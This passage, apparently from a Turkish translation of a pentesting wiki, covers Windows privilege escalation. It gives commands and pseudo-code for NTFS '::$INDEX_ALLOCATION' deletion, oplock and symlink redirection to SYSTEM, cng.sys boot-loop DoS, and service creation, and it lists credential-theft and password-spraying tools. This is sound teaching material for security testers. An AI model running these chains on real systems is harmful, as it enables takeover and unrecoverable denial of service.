    - **Boom**: Kodunuz **SYSTEM olarak** çalışır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (bir önceki teknik), **tüm bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya vulnerability'niz yalnızca **arbitrary file deletion** sağlıyorsa?

**NTFS internals**'ı istismar edebilirsiniz: her klasörün şu adlı gizli bir alternate data stream'i vardır:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **indeks meta verilerini** depolar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream’ini silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu şu standart dosya silme API’lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *dosya* silme API'sini çağırıyor olsanız bile, **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir klasörün *içeriğini* silmeye izin veriyorsa** ne olur?

1. Adım 1: Yem klasör ve dosyası oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerinde bir **oplock** ayarlayın
- Ayrıcalıklı bir süreç `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process'i tetikleyin (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize aktarır.

4. Step 4: Oplock callback içinde – silme işlemini yönlendirin

- Option A: `file1.txt` dosyasını başka bir yere taşıyın
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i erkenden serbest bırakır.

- Option B: `folder1` klasörünü bir **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS internal stream'i hedefler — bunu silmek klasörü siler.

5. Step 5: Oplock'i serbest bırakın
- SYSTEM süreci devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle aslında silinen şudur:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Keyfi Klasör Oluşturmadan Kalıcı DoS’a

**SYSTEM/admin olarak keyfi bir klasör oluşturmanı** sağlayan bir primitive’i exploit et — **dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsan bile.

**Kritik bir Windows driver’ının** adını taşıyan bir **klasör** oluştur (dosya değil), örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu path normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden bir klasör olarak oluşturursanız**, Windows açılışta gerçek driver'ı yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümleyemez** ve **çöker ya da açılışı durdurur**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya diske erişim) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı log/backup path'lerinden ve OM symlink'lerinden keyfi dosya üzerine yazma / boot DoS'a

Bir **ayrıcalıklı service**, **yazılabilir bir config** dosyasından okuduğu bir path'e log/çıktı yazdığında, ayrıcalıklı yazma işlemini keyfi dosya üzerine yazmaya dönüştürmek için bu path'i **Object Manager symlinks + NTFS mount points** ile yönlendirin (SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef path'i içeren config dosyası saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumunda bir mount point ve bir OM file symlink oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu path'e yazan ayrıcalıklı bir işlem (log, export, report).

**Örnek zincir**
1. Ayrıcalıklı log hedefini belirlemek için config'i okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` dosyasındaki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan path'i yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin günlüğü yazmasını bekleyin (ör. yönetici "send test SMS" işlemini başlatır). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesini zorlar → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir servisin yazma amacıyla açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir, ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir ve bozuk veriler için güvenilir bir DoS hedefi oluşturabilir.



## **High Integrity'den System'e**

### **Yeni service**

Zaten bir High Integrity sürecinde çalışıyorsanız, **SYSTEM'e giden yol** yalnızca **yeni bir service oluşturup çalıştırarak** kolayca açılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[İlgili registry key'leri ve bir _.msi_ paketin nasıl yükleneceği hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token privileges'a

Bu token privilege'larına sahipseniz (muhtemelen bunları zaten High Integrity olan bir process'te bulursunuz), SeDebug privilege'ını kullanarak **neredeyse her process'i** (protected process'ler hariç) **açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **istediğiniz bir process'i oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token privilege'larına sahip SYSTEM olarak çalışan herhangi bir process'i seçmek için** kullanılır (_evet, tüm token privilege'larına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` içinde privilege escalation için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından, **`SeImpersonate`** privilege'ını kullanarak pipe'ı oluşturan **server**, pipe client'ının (service'in) **token'ını impersonate** ederek SYSTEM privilege'ları elde edebilir.\
[**Named pipe'lar hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Named pipe'ları kullanarak High Integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir **dll'yi hijack edebilirseniz**, o process'in izinleriyle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking, bu tür privilege escalation için de kullanışlıdır. Ayrıca, dll'lerin yüklendiği klasörlere **yazma izinleri** olacağından, bunu **High Integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında daha fazla bilgiyi** [**burada bulabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten full privs'a

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası bazı yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Kaydedilmiş PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP oturum bilgilerini çıkarır. Local ortamda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc güvenlik açıklarını arar (Watson nedeniyle DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc güvenlik açıklarını arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u enumerate eder (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da düzgün çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da düzgün çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (düzgün çalışmak için accesschk gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Yetki Yükseltme Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Yetki Yükseltme - başvuru notları](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Yerel Yetki Yükseltme Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni siyah (Rob Fuller ve Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Yetki Yükseltme - Windows - Eksiksiz OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Yetki Yükseltme - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Yetki Yükseltme Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Yetki-Yükseltme kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Yetki-Yükseltme](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Yetki Yükseltme Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerini çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi-Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Açılan Bir Bağlantı: Windows'ta Symbolic Link'lerin Kötüye Kullanılması](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port'u)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Güven İhlalleri: Windows'ta Tehlikeli Modül Çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi zorlukları, çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hizmet ikili dosyalarının ele geçirilmesi](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek Bir I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitive'i](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Rastgele Dosya Silme İşlemlerini Kötüye Kullanarak Yetki Yükseltme ve Diğer Harika Yöntemler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10 Yerel Yetki Yükseltme 1-Day'i](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Kaynak Tabanlı Kısıtlı Delegasyon: Bir Görüntü Değişikliği Nasıl Yetki Yükseltmeye Yol Açar](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Yetki Yükseltme](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM'e Geri Dönüş Adımlarını İzleme](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services paylaşımlı bellek offset'leri yetki yükseltme güvenlik duyurusu](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
